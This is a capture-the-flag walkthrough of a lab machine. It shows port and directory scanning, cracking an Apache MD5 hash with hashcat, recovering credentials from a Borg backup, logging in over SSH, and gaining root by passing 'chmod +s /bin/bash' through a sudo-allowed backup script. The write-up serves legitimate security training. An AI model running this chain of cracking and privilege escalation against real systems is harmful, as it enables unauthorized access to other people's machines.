#### 1. Scanning 

```
nmap -Pn -A -T4 10.10.106.99                                          130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-26 11:24 EST
Nmap scan report for 10.10.106.99
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.95 seconds
```

#### 2. Gobuster

```
gobuster dir -u http://10.10.106.99 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.106.99
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
2021/01/26 11:26:08 Starting gobuster
===============================================================
/index.html (Status: 200)
/admin (Status: 301)
/etc (Status: 301)
```

There are two directiories found - `/admin` and `/etc/`. In first one, we access Archive section and download `archive.zip` to our machine for further investigation.

In another one `/etc` there is a file with username and hash alltogether:

`music_archives:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`



#### 3. Identyfing found hash

Thanks to has-identifer, we guess the type which is MD5:

```
hash-identifier                                                        
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

Possible Hashs:
[+] MD5(APR)
```

However, after after little of googling, in fact it is `Apache $apr1$ MD5, md5apr1, MD5 (APR) 2` 



#### 4. Cracking hash with hashcat

Hashcat type number is `1600` so full command will be:

```
hashcat --force -m 1600 -a 0 hash /usr/share/wordlists/rockyou.txt

```

After some time it gives a password:

`$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward`
                                                 
so final credentials are

`music_archive:squidward`



#### 5. Checking archive.zip

I download and extract the archive:

`tar -xvf archive.zip`

There are many files inside, including `README` which says it is a Borg repository 



#### 6. Using borg to extract a repository

First of all, I list files which are inside and enter passphrase cracked earlier:

```
borg list /home/kali/Downloads/home/field/dev/final_archive
Enter passphrase for key /home/kali/Downloads/home/field/dev/final_archive: 
music_archive                        Tue, 2020-12-29 09:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```

Then, I create a folder where I wil extract files:

`mkdir music_archive`

then mount `final_archive` to `music_archive`

```
borg mount /home/kali/Downloads/home/field/dev/final_archive music_archive 
Enter passphrase for key /home/kali/Downloads/home/field/dev/final_archive: 
```

and once done, I find backuped directory `/home/alex` with many directories:

```
kali㉿kali)-[~/…/music_archive/music_archive/home/alex]
└─$ ls -al
total 6
drwxr-xr-x 1 1001 1001    0 Dec 29 08:55 .
drwxr-xr-x 1 kali kali    0 Jan 26 12:25 ..
-rw------- 1 1001 1001  439 Dec 28 12:26 .bash_history
-rw-r--r-- 1 1001 1001  220 Dec 28 09:25 .bash_logout
-rw-r--r-- 1 1001 1001 3637 Dec 28 09:25 .bashrc
drwx------ 1 root root    0 Dec 28 11:33 .config
drwx------ 1 root root    0 Dec 28 11:33 .dbus
drwxrwxr-x 1 1001 1001    0 Dec 29 08:57 Desktop
drwxrwxr-x 1 1001 1001    0 Dec 29 08:55 Documents
drwxrwxr-x 1 1001 1001    0 Dec 28 12:59 Downloads
drwxrwxr-x 1 1001 1001    0 Dec 28 13:00 Music
drwxrwxr-x 1 1001 1001    0 Dec 28 13:26 Pictures
-rw-r--r-- 1 1001 1001  675 Dec 28 09:25 .profile
drwxrwxr-x 1 1001 1001    0 Dec 28 12:59 Public
drwxrwxr-x 1 1001 1001    0 Dec 28 13:00 Templates
drwxrwxr-x 1 1001 1001    0 Dec 28 12:59 Videos
```

After quick research I find `note.txt` inside `Documents`

```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

From now on, having both, we can ssh  to machine and become oot.



#### 7. SSH as alex

I ssh and in home direcotry there is user.txt flag:

```
alex@ubuntu:~$ ls -al
total 108
drwx------ 17 alex alex 4096 Dec 31 10:45 .
drwxr-xr-x  3 root root 4096 Dec 30 01:36 ..
-rw-------  1 alex alex 1145 Dec 31 10:50 .bash_history
-rw-r--r--  1 alex alex  220 Dec 30 01:36 .bash_logout
-rw-r--r--  1 alex alex 3771 Dec 30 01:36 .bashrc
drwx------ 13 alex alex 4096 Jan 26 09:32 .cache
drwx------  3 alex alex 4096 Dec 30 02:28 .compiz
drwx------ 15 alex alex 4096 Dec 30 01:48 .config
drwxr-xr-x  2 alex alex 4096 Dec 30 01:39 Desktop
-rw-r--r--  1 alex alex   25 Dec 30 01:39 .dmrc
drwxr-xr-x  2 alex alex 4096 Dec 30 01:39 Documents
drwxr-xr-x  2 alex alex 4096 Dec 31 10:46 Downloads
drwx------  2 alex alex 4096 Dec 30 01:40 .gconf
drwx------  3 alex alex 4096 Dec 31 10:45 .gnupg
-rw-------  1 alex alex 1590 Dec 31 10:45 .ICEauthority
drwx------  3 alex alex 4096 Dec 30 01:39 .local
drwx------  5 alex alex 4096 Dec 30 01:43 .mozilla
drwxr-xr-x  2 alex alex 4096 Dec 30 02:12 Music
drwxr-xr-x  2 alex alex 4096 Dec 30 01:39 Pictures
-rw-r--r--  1 alex alex  655 Dec 30 01:36 .profile
drwxr-xr-x  2 alex alex 4096 Dec 30 01:39 Public
-rw-r--r--  1 alex alex    0 Dec 30 01:41 .sudo_as_admin_successful
drwxr-xr-x  2 alex alex 4096 Dec 30 01:39 Templates
-r-xr--r--  1 alex alex   40 Dec 30 02:26 user.txt
drwxr-xr-x  2 alex alex 4096 Dec 30 01:39 Videos
-rw-------  1 alex alex   51 Dec 31 10:44 .Xauthority
-rw-------  1 alex alex   82 Dec 31 10:45 .xsession-errors
-rw-------  1 alex alex   82 Dec 31 02:40 .xsession-errors.old
alex@ubuntu:~$ cat user.txt
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
alex@ubuntu:~$ 
```



#### 8. Escalate to root

I check `sudo -l`  and turns out alex can execute a custom script which backups files, however in the end it runs as root

It backups files, however in the end there is a weird part:

```
while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done
```

which echoes command we type with `-c` before it, and user is root.

So let's give ourselves root:

`sudo ./backup.sh -c "chmod +s /bin/bash"`

and switch to it:

`bash -p`

and it's done:

```
bash-4.3# cat /root/root.txt
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

That was a great one !


